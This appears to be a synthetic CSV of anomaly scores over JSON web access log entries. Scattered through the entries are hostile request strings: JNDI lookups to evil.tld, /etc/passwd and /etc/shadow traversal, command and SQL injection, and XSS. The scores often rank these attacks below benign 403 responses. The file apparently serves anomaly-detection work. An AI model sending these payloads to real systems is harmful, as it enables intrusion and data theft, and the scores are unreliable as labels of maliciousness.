score_content,score_session,score_fused,score_fused_norm,line
93.9421615600586,,93.9421615600586,93.9421615600586,{"remote_addr": "62.4.133.150", "time_local": "11/Jan/2025:09:05:04 -0700", "request": "OPTIONS /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 16281, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "python-requests/2.31.0"}
102.8823471069336,,102.8823471069336,102.8823471069336,{"remote_addr": "244.39.118.82", "time_local": "11/Jan/2025:09:05:05 -0700", "request": "TRACE /phpmyadmin HTTP/2", "status": 200, "body_bytes_sent": 4174, "http_referer": "https://twitter.com/", "http_user_agent": "python-requests/2.31.0"}
27.67729377746582,,27.67729377746582,27.67729377746582,{"remote_addr": "203.72.250.207", "time_local": "11/Jan/2025:09:05:05 -0700", "request": "DELETE /../../etc/passwd HTTP/2", "status": 302, "body_bytes_sent": 3492, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
0.2607027292251587,,0.2607027292251587,0.2607027292251587,{"remote_addr": "153.24.142.110", "time_local": "11/Jan/2025:09:05:06 -0700", "request": "GET /assets/app.css HTTP/2", "status": 200, "body_bytes_sent": 8922, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
0.3089129626750946,,0.3089129626750946,0.3089129626750946,{"remote_addr": "125.214.230.195", "time_local": "11/Jan/2025:09:05:07 -0700", "request": "GET /assets/app.js HTTP/2", "status": 200, "body_bytes_sent": 15544, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
46.398643493652344,,46.398643493652344,46.398643493652344,{"remote_addr": "246.10.198.240", "time_local": "11/Jan/2025:09:05:07 -0700", "request": "HEAD /api/products HTTP/2", "status": 200, "body_bytes_sent": 1391, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
93.9251937866211,,93.9251937866211,93.9251937866211,{"remote_addr": "36.97.68.31", "time_local": "11/Jan/2025:09:05:08 -0700", "request": "OPTIONS /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 10904, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
30216.314453125,,30216.314453125,30216.314453125,{"remote_addr": "228.183.10.247", "time_local": "11/Jan/2025:09:05:08 -0700", "request": "OPTIONS /api/product?id=123 HTTP/2", "status": 401, "body_bytes_sent": 1321, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
30150.3984375,,30150.3984375,30150.3984375,{"remote_addr": "50.223.219.223", "time_local": "11/Jan/2025:09:05:09 -0700", "request": "DELETE / HTTP/2", "status": 404, "body_bytes_sent": 342, "http_referer": "https://example.com/", "http_user_agent": "python-requests/2.31.0"}
68.56185913085938,,68.56185913085938,68.56185913085938,{"remote_addr": "219.41.147.148", "time_local": "11/Jan/2025:09:05:10 -0700", "request": "HEAD /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 8850, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
48.85114669799805,,48.85114669799805,48.85114669799805,{"remote_addr": "139.70.29.153", "time_local": "11/Jan/2025:09:05:10 -0700", "request": "DELETE /search?q=laptop HTTP/2", "status": 200, "body_bytes_sent": 5126, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
12.843127250671387,,12.843127250671387,12.843127250671387,{"remote_addr": "215.199.122.98", "time_local": "11/Jan/2025:09:05:10 -0700", "request": "PUT /contact HTTP/2", "status": 200, "body_bytes_sent": 15064, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "nikto/2.5.0"}
7.29032564163208,,7.29032564163208,7.29032564163208,{"remote_addr": "95.112.233.92", "time_local": "11/Jan/2025:09:05:11 -0700", "request": "POST /login HTTP/2", "status": 304, "body_bytes_sent": 12334, "http_referer": "-", "http_user_agent": "python-requests/2.31.0"}
4.58464241027832,,4.58464241027832,4.58464241027832,{"remote_addr": "95.167.130.150", "time_local": "11/Jan/2025:09:05:12 -0700", "request": "POST /logout HTTP/2", "status": 200, "body_bytes_sent": 9765, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
4.683923721313477,,4.683923721313477,4.683923721313477,{"remote_addr": "127.168.83.86", "time_local": "11/Jan/2025:09:05:12 -0700", "request": "GET /login HTTP/2", "status": 302, "body_bytes_sent": 13432, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
24.089567184448242,,24.089567184448242,24.089567184448242,{"remote_addr": "80.164.25.181", "time_local": "11/Jan/2025:09:05:12 -0700", "request": "GET /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 200, "body_bytes_sent": 3103, "http_referer": "https://www.google.com/", "http_user_agent": "curl/7.85.0"}
49.10385513305664,,49.10385513305664,49.10385513305664,{"remote_addr": "171.74.41.136", "time_local": "11/Jan/2025:09:05:13 -0700", "request": "HEAD /dashboard HTTP/2", "status": 304, "body_bytes_sent": 16391, "http_referer": "https://twitter.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
30169.51171875,,30169.51171875,30169.51171875,{"remote_addr": "226.240.164.45", "time_local": "11/Jan/2025:09:05:14 -0700", "request": "HEAD /logout HTTP/2", "status": 401, "body_bytes_sent": 449, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
30147.501953125,,30147.501953125,30147.501953125,{"remote_addr": "96.175.201.226", "time_local": "11/Jan/2025:09:05:14 -0700", "request": "GET /search?q=camera HTTP/2", "status": 403, "body_bytes_sent": 608, "http_referer": "-", "http_user_agent": "dirb/2.22"}
103.89743041992188,,103.89743041992188,103.89743041992188,{"remote_addr": "239.87.196.197", "time_local": "11/Jan/2025:09:05:15 -0700", "request": "TRACE /cgi-bin/test.cgi HTTP/2", "status": 302, "body_bytes_sent": 11455, "http_referer": "https://example.com/", "http_user_agent": "dirb/2.22"}
48.850955963134766,,48.850955963134766,48.850955963134766,{"remote_addr": "224.46.51.15", "time_local": "11/Jan/2025:09:05:16 -0700", "request": "DELETE /search?q=router HTTP/2", "status": 200, "body_bytes_sent": 5083, "http_referer": "https://example.com/", "http_user_agent": "dirb/2.22"}
12.800263404846191,,12.800263404846191,12.800263404846191,{"remote_addr": "28.179.90.47", "time_local": "11/Jan/2025:09:05:17 -0700", "request": "PUT /profile HTTP/2", "status": 200, "body_bytes_sent": 1056, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
4.625972747802734,,4.625972747802734,4.625972747802734,{"remote_addr": "184.136.203.162", "time_local": "11/Jan/2025:09:05:17 -0700", "request": "GET /profile HTTP/2", "status": 304, "body_bytes_sent": 7067, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
26.608070373535156,,26.608070373535156,26.608070373535156,{"remote_addr": "65.27.133.15", "time_local": "11/Jan/2025:09:05:18 -0700", "request": "POST /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 4572, "http_referer": "-", "http_user_agent": "nikto/2.5.0"}
30125.775390625,,30125.775390625,30125.775390625,{"remote_addr": "15.79.229.49", "time_local": "11/Jan/2025:09:05:19 -0700", "request": "GET /contact HTTP/2", "status": 403, "body_bytes_sent": 363, "http_referer": "https://twitter.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
48.807029724121094,,48.807029724121094,48.807029724121094,{"remote_addr": "8.46.238.63", "time_local": "11/Jan/2025:09:05:20 -0700", "request": "DELETE /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/2", "status": 200, "body_bytes_sent": 12687, "http_referer": "https://www.google.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
2.8740243911743164,,2.8740243911743164,2.8740243911743164,{"remote_addr": "239.63.227.208", "time_local": "11/Jan/2025:09:05:20 -0700", "request": "GET /assets/app.js HTTP/2", "status": 301, "body_bytes_sent": 2340, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
70.24909210205078,,70.24909210205078,70.24909210205078,{"remote_addr": "161.135.94.227", "time_local": "11/Jan/2025:09:05:21 -0700", "request": "OPTIONS /wp-login.php HTTP/2", "status": 200, "body_bytes_sent": 2412, "http_referer": "-", "http_user_agent": "nikto/2.5.0"}
4.340332508087158,,4.340332508087158,4.340332508087158,{"remote_addr": "235.38.58.140", "time_local": "11/Jan/2025:09:05:22 -0700", "request": "POST /server-status HTTP/2", "status": 200, "body_bytes_sent": 4173, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "nikto/2.5.0"}
1.9790253639221191,,1.9790253639221191,1.9790253639221191,{"remote_addr": "128.105.3.52", "time_local": "11/Jan/2025:09:05:23 -0700", "request": "GET /profile HTTP/2", "status": 200, "body_bytes_sent": 12576, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
71.20750427246094,,71.20750427246094,71.20750427246094,{"remote_addr": "167.233.72.38", "time_local": "11/Jan/2025:09:05:24 -0700", "request": "HEAD /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 302, "body_bytes_sent": 1242, "http_referer": "https://example.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
30126.779296875,,30126.779296875,30126.779296875,{"remote_addr": "204.66.199.225", "time_local": "11/Jan/2025:09:05:24 -0700", "request": "POST /index.html HTTP/2", "status": 403, "body_bytes_sent": 81, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
125.0776138305664,,125.0776138305664,125.0776138305664,{"remote_addr": "11.25.158.168", "time_local": "11/Jan/2025:09:05:25 -0700", "request": "TRACE /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 14430, "http_referer": "https://example.com/", "http_user_agent": "python-requests/2.31.0"}
72.91844940185547,,72.91844940185547,72.91844940185547,{"remote_addr": "148.246.69.79", "time_local": "11/Jan/2025:09:05:26 -0700", "request": "OPTIONS /index.html HTTP/2", "status": 302, "body_bytes_sent": 4055, "http_referer": "https://example.com/", "http_user_agent": "curl/7.85.0"}
2.8935816287994385,,2.8935816287994385,2.8935816287994385,{"remote_addr": "93.75.143.136", "time_local": "11/Jan/2025:09:05:27 -0700", "request": "GET /assets/app.js HTTP/2", "status": 302, "body_bytes_sent": 2101, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
93.9159164428711,,93.9159164428711,93.9159164428711,{"remote_addr": "224.169.93.210", "time_local": "11/Jan/2025:09:05:28 -0700", "request": "OPTIONS /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 8339, "http_referer": "https://twitter.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
24.233692169189453,,24.233692169189453,24.233692169189453,{"remote_addr": "128.128.242.42", "time_local": "11/Jan/2025:09:05:29 -0700", "request": "GET /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/2", "status": 200, "body_bytes_sent": 17135, "http_referer": "https://twitter.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
0.31497737765312195,,0.31497737765312195,0.31497737765312195,{"remote_addr": "213.180.115.55", "time_local": "11/Jan/2025:09:05:30 -0700", "request": "GET /.git/config HTTP/2", "status": 200, "body_bytes_sent": 2841, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "python-requests/2.31.0"}
101.39949035644531,,101.39949035644531,101.39949035644531,{"remote_addr": "88.241.11.197", "time_local": "11/Jan/2025:09:05:31 -0700", "request": "TRACE /.git/config HTTP/2", "status": 200, "body_bytes_sent": 7025, "http_referer": "https://twitter.com/", "http_user_agent": "curl/7.85.0"}
15.537618637084961,,15.537618637084961,15.537618637084961,{"remote_addr": "18.42.125.166", "time_local": "11/Jan/2025:09:05:32 -0700", "request": "PUT /about HTTP/2", "status": 302, "body_bytes_sent": 15660, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
25.185649871826172,,25.185649871826172,25.185649871826172,{"remote_addr": "179.112.172.176", "time_local": "11/Jan/2025:09:05:32 -0700", "request": "DELETE /wp-login.php HTTP/2", "status": 200, "body_bytes_sent": 13260, "http_referer": "https://example.com/", "http_user_agent": "dirb/2.22"}
71.74462890625,,71.74462890625,71.74462890625,{"remote_addr": "7.21.136.71", "time_local": "11/Jan/2025:09:05:33 -0700", "request": "OPTIONS /server-status HTTP/2", "status": 200, "body_bytes_sent": 17707, "http_referer": "https://twitter.com/", "http_user_agent": "nikto/2.5.0"}
7.123077869415283,,7.123077869415283,7.123077869415283,{"remote_addr": "139.206.242.159", "time_local": "11/Jan/2025:09:05:34 -0700", "request": "POST /dashboard HTTP/2", "status": 302, "body_bytes_sent": 17410, "http_referer": "https://example.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
93.93826293945312,,93.93826293945312,93.93826293945312,{"remote_addr": "34.171.190.41", "time_local": "11/Jan/2025:09:05:35 -0700", "request": "OPTIONS /search?q=camera HTTP/2", "status": 200, "body_bytes_sent": 8585, "http_referer": "https://www.google.com/", "http_user_agent": "dirb/2.22"}
30216.55078125,,30216.55078125,30216.55078125,{"remote_addr": "59.151.127.62", "time_local": "11/Jan/2025:09:05:35 -0700", "request": "OPTIONS /search?q=ssd HTTP/2", "status": 403, "body_bytes_sent": 114, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
49.06399154663086,,49.06399154663086,49.06399154663086,{"remote_addr": "109.37.251.205", "time_local": "11/Jan/2025:09:05:35 -0700", "request": "DELETE /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/2", "status": 200, "body_bytes_sent": 16746, "http_referer": "https://twitter.com/", "http_user_agent": "curl/7.85.0"}
30224.16796875,,30224.16796875,30224.16796875,{"remote_addr": "53.249.188.148", "time_local": "11/Jan/2025:09:05:36 -0700", "request": "TRACE /index.html HTTP/2", "status": 403, "body_bytes_sent": 118, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
30171.568359375,,30171.568359375,30171.568359375,{"remote_addr": "141.88.220.206", "time_local": "11/Jan/2025:09:05:37 -0700", "request": "DELETE /search?q=headphones HTTP/2", "status": 401, "body_bytes_sent": 601, "http_referer": "https://example.com/", "http_user_agent": "python-requests/2.31.0"}
2.922199010848999,,2.922199010848999,2.922199010848999,{"remote_addr": "67.74.89.227", "time_local": "11/Jan/2025:09:05:38 -0700", "request": "GET /assets/app.css HTTP/2", "status": 304, "body_bytes_sent": 5645, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
70.34971618652344,,70.34971618652344,70.34971618652344,{"remote_addr": "37.84.254.186", "time_local": "11/Jan/2025:09:05:38 -0700", "request": "OPTIONS /.git/config HTTP/2", "status": 200, "body_bytes_sent": 170, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "dirb/2.22"}
29.73552703857422,,29.73552703857422,29.73552703857422,{"remote_addr": "214.151.119.72", "time_local": "11/Jan/2025:09:05:39 -0700", "request": "DELETE / HTTP/2", "status": 304, "body_bytes_sent": 4208, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
30147.517578125,,30147.517578125,30147.517578125,{"remote_addr": "67.193.198.62", "time_local": "11/Jan/2025:09:05:40 -0700", "request": "GET /api/user?id=1;DROP TABLE users HTTP/2", "status": 403, "body_bytes_sent": 1073, "http_referer": "https://example.com/", "http_user_agent": "curl/7.85.0"}
2.256199359893799,,2.256199359893799,2.256199359893799,{"remote_addr": "181.248.171.87", "time_local": "11/Jan/2025:09:05:40 -0700", "request": "GET / HTTP/2", "status": 200, "body_bytes_sent": 8759, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
48.91645812988281,,48.91645812988281,48.91645812988281,{"remote_addr": "122.150.161.62", "time_local": "11/Jan/2025:09:05:41 -0700", "request": "DELETE /search?q=phone HTTP/2", "status": 200, "body_bytes_sent": 16499, "http_referer": "-", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
34.8802604675293,,34.8802604675293,34.8802604675293,{"remote_addr": "238.227.252.24", "time_local": "11/Jan/2025:09:05:42 -0700", "request": "PUT /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 2262, "http_referer": "https://twitter.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
1.8723796606063843,,1.8723796606063843,1.8723796606063843,{"remote_addr": "123.52.49.89", "time_local": "11/Jan/2025:09:05:42 -0700", "request": "GET /phpmyadmin HTTP/2", "status": 200, "body_bytes_sent": 10618, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
71.96112060546875,,71.96112060546875,71.96112060546875,{"remote_addr": "197.54.97.224", "time_local": "11/Jan/2025:09:05:42 -0700", "request": "OPTIONS /about HTTP/2", "status": 200, "body_bytes_sent": 5762, "http_referer": "https://twitter.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
46.430057525634766,,46.430057525634766,46.430057525634766,{"remote_addr": "241.177.150.138", "time_local": "11/Jan/2025:09:05:44 -0700", "request": "HEAD /api/products HTTP/2", "status": 200, "body_bytes_sent": 11037, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
1.9387065172195435,,1.9387065172195435,1.9387065172195435,{"remote_addr": "36.184.68.223", "time_local": "11/Jan/2025:09:05:44 -0700", "request": "GET /profile HTTP/2", "status": 200, "body_bytes_sent": 2226, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
24.045875549316406,,24.045875549316406,24.045875549316406,{"remote_addr": "99.229.118.59", "time_local": "11/Jan/2025:09:05:44 -0700", "request": "GET /search?q=phone HTTP/2", "status": 200, "body_bytes_sent": 8304, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "nikto/2.5.0"}
102.90215301513672,,102.90215301513672,102.90215301513672,{"remote_addr": "74.190.96.21", "time_local": "11/Jan/2025:09:05:45 -0700", "request": "TRACE /phpmyadmin HTTP/2", "status": 200, "body_bytes_sent": 9188, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
74.63146209716797,,74.63146209716797,74.63146209716797,{"remote_addr": "128.215.150.137", "time_local": "11/Jan/2025:09:05:46 -0700", "request": "OPTIONS /about HTTP/2", "status": 304, "body_bytes_sent": 13292, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
24.05351448059082,,24.05351448059082,24.05351448059082,{"remote_addr": "247.127.208.231", "time_local": "11/Jan/2025:09:05:47 -0700", "request": "GET /search?q=camera HTTP/2", "status": 200, "body_bytes_sent": 17324, "http_referer": "https://twitter.com/", "http_user_agent": "curl/7.85.0"}
93.92192077636719,,93.92192077636719,93.92192077636719,{"remote_addr": "66.72.129.131", "time_local": "11/Jan/2025:09:05:48 -0700", "request": "OPTIONS /search?q=laptop HTTP/2", "status": 200, "body_bytes_sent": 4386, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
71.89117431640625,,71.89117431640625,71.89117431640625,{"remote_addr": "152.85.6.185", "time_local": "11/Jan/2025:09:05:48 -0700", "request": "OPTIONS /contact HTTP/2", "status": 204, "body_bytes_sent": 8593, "http_referer": "-", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
103.0986099243164,,103.0986099243164,103.0986099243164,{"remote_addr": "141.195.23.159", "time_local": "11/Jan/2025:09:05:49 -0700", "request": "TRACE /login HTTP/2", "status": 200, "body_bytes_sent": 15696, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
125.15143585205078,,125.15143585205078,125.15143585205078,{"remote_addr": "243.155.238.18", "time_local": "11/Jan/2025:09:05:49 -0700", "request": "TRACE /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 200, "body_bytes_sent": 16804, "http_referer": "https://twitter.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
12.777335166931152,,12.777335166931152,12.777335166931152,{"remote_addr": "226.99.142.218", "time_local": "11/Jan/2025:09:05:50 -0700", "request": "PUT /dashboard HTTP/2", "status": 200, "body_bytes_sent": 15827, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
93.9411392211914,,93.9411392211914,93.9411392211914,{"remote_addr": "177.86.226.20", "time_local": "11/Jan/2025:09:05:51 -0700", "request": "OPTIONS /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 15936, "http_referer": "https://twitter.com/", "http_user_agent": "dirb/2.22"}
125.04902648925781,,125.04902648925781,125.04902648925781,{"remote_addr": "55.35.12.184", "time_local": "11/Jan/2025:09:05:52 -0700", "request": "TRACE /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 17541, "http_referer": "https://twitter.com/", "http_user_agent": "python-requests/2.31.0"}
2.0135934352874756,,2.0135934352874756,2.0135934352874756,{"remote_addr": "2.28.78.233", "time_local": "11/Jan/2025:09:05:52 -0700", "request": "GET /about HTTP/2", "status": 200, "body_bytes_sent": 2272, "http_referer": "https://example.com/", "http_user_agent": "Wget/1.21.2 (linux-gnu)"}
1.9239158630371094,,1.9239158630371094,1.9239158630371094,{"remote_addr": "191.85.132.134", "time_local": "11/Jan/2025:09:05:53 -0700", "request": "GET /dashboard HTTP/2", "status": 200, "body_bytes_sent": 16629, "http_referer": "https://example.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
12.863409042358398,,12.863409042358398,12.863409042358398,{"remote_addr": "46.11.154.19", "time_local": "11/Jan/2025:09:05:54 -0700", "request": "PUT /logout HTTP/2", "status": 200, "body_bytes_sent": 10262, "http_referer": "-", "http_user_agent": "curl/7.85.0"}
30167.900390625,,30167.900390625,30167.900390625,{"remote_addr": "84.212.229.210", "time_local": "11/Jan/2025:09:05:55 -0700", "request": "HEAD /cgi-bin/test.cgi HTTP/2", "status": 403, "body_bytes_sent": 1193, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "python-requests/2.31.0"}
26.61669921875,,26.61669921875,26.61669921875,{"remote_addr": "158.127.22.228", "time_local": "11/Jan/2025:09:05:56 -0700", "request": "POST /search?q=camera HTTP/2", "status": 200, "body_bytes_sent": 10459, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "python-requests/2.31.0"}
4.835637092590332,,4.835637092590332,4.835637092590332,{"remote_addr": "12.22.90.121", "time_local": "11/Jan/2025:09:05:56 -0700", "request": "POST / HTTP/2", "status": 200, "body_bytes_sent": 8721, "http_referer": "-", "http_user_agent": "python-requests/2.31.0"}
68.57067108154297,,68.57067108154297,68.57067108154297,{"remote_addr": "209.187.96.182", "time_local": "11/Jan/2025:09:05:57 -0700", "request": "HEAD /api/product?id=123 HTTP/2", "status": 200, "body_bytes_sent": 11347, "http_referer": "-", "http_user_agent": "dirb/2.22"}
125.01223754882812,,125.01223754882812,125.01223754882812,{"remote_addr": "51.72.186.152", "time_local": "11/Jan/2025:09:05:58 -0700", "request": "TRACE /search?q=monitor HTTP/2", "status": 200, "body_bytes_sent": 6602, "http_referer": "https://news.ycombinator.com/", "http_user_agent": "curl/7.85.0"}
12.779023170471191,,12.779023170471191,12.779023170471191,{"remote_addr": "70.22.70.105", "time_local": "11/Jan/2025:09:05:58 -0700", "request": "PUT /dashboard HTTP/2", "status": 200, "body_bytes_sent": 16389, "http_referer": "-", "http_user_agent": "sqlmap/1.7.2#stable"}
26.782337188720703,,26.782337188720703,26.782337188720703,{"remote_addr": "94.187.221.201", "time_local": "11/Jan/2025:09:05:59 -0700", "request": "POST /search?q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/2", "status": 200, "body_bytes_sent": 6570, "http_referer": "https://example.com/", "http_user_agent": "python-requests/2.31.0"}
125.083740234375,,125.083740234375,125.083740234375,{"remote_addr": "192.85.76.122", "time_local": "11/Jan/2025:09:06:00 -0700", "request": "TRACE /search?q=phone HTTP/2", "status": 200, "body_bytes_sent": 14069, "http_referer": "https://twitter.com/", "http_user_agent": "sqlmap/1.7.2#stable"}
26.69109344482422,,26.69109344482422,26.69109344482422,{"remote_addr": "176.163.28.7", "time_local": "11/Jan/2025:09:06:01 -0700", "request": "GET /search?q=laptop HTTP/2", "status": 304, "body_bytes_sent": 12129, "http_referer": "https://twitter.com/", "http_user_agent": "curl/7.85.0"}
26.63903045654297,,26.63903045654297,26.63903045654297,{"remote_addr": "10.29.167.70", "time_local": "11/Jan/2025:09:06:02 -0700", "request": "POST /api/backup?file=../../../../etc/shadow HTTP/2", "status": 200, "body_bytes_sent": 14906, "http_referer": "-", "http_user_agent": "nikto/2.5.0"}
46.776424407958984,,46.776424407958984,46.776424407958984,{"remote_addr": "32.54.38.89", "time_local": "11/Jan/2025:09:06:02 -0700", "request": "HEAD / HTTP/2", "status": 200, "body_bytes_sent": 4528, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"}
73.00455474853516,,73.00455474853516,73.00455474853516,{"remote_addr": "199.189.53.254", "time_local": "11/Jan/2025:09:06:04 -0700", "request": "OPTIONS /index.html HTTP/2", "status": 304, "body_bytes_sent": 16852, "http_referer": "https://www.google.com/", "http_user_agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"}
125.14551544189453,,125.14551544189453,125.14551544189453,{"remote_addr": "122.34.104.49", "time_local": "11/Jan/2025:09:06:04 -0700", "request": "TRACE /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/2", "status": 200, "body_bytes_sent": 14796, "http_referer": "https://www.google.com/", "http_user_agent": "nikto/2.5.0"}
